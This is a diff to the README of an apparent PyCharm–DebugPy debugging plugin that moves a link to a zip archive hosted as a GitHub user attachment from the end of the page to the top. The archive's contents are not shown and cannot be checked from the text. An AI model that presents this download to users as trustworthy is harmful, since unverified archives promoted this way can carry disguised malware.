@@ -2,6 +2,13 @@
 
 This plugin provides a Debug Adapter Protocol (DAP)-based integration between PyCharm and DebugPy, with optional live function tracing and performance profiling support.
 
+
+---
+
+Download plugin file
+[Plugin v1.0.zip](https://github.com/user-attachments/files/19634101/Plugin.v1.0.zip)
+
+
 ---
 
 ## 🔧 Debugging Integration
@@ -64,9 +71,6 @@ This plugin provides a Debug Adapter Protocol (DAP)-based integration between Py
 - ✅ Requires Python 3.6+
 - ✅ Automatically installs `pyyaml` if missing
 
----
 
-Download plugin file
-[Plugin v1.0.zip](https://github.com/user-attachments/files/19634101/Plugin.v1.0.zip)
 
 
